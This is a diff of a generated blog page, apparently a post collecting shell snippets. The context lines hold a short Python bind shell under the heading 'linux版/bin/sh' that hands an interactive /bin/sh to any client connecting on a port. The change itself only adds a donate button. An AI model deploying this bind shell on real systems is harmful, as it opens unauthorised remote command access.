@@ -136,6 +136,16 @@
 <h3 id="linux版-bin-sh"><a href="#linux版-bin-sh" class="headerlink" title="linux版/bin/sh"></a>linux版/bin/sh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys</span><br><span class="line"></span><br><span class="line">server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">server.bind((&apos;0.0.0.0&apos;,port))</span><br><span class="line">server.listen(5)</span><br><span class="line">talk, addr = server.accept()</span><br><span class="line">print(&quot;connecting &quot;, addr)</span><br><span class="line">proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</span><br><span class="line">                        stdout=talk, stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
 
         
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/pay.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
         <div id="comment-container">
         </div>
     </div>
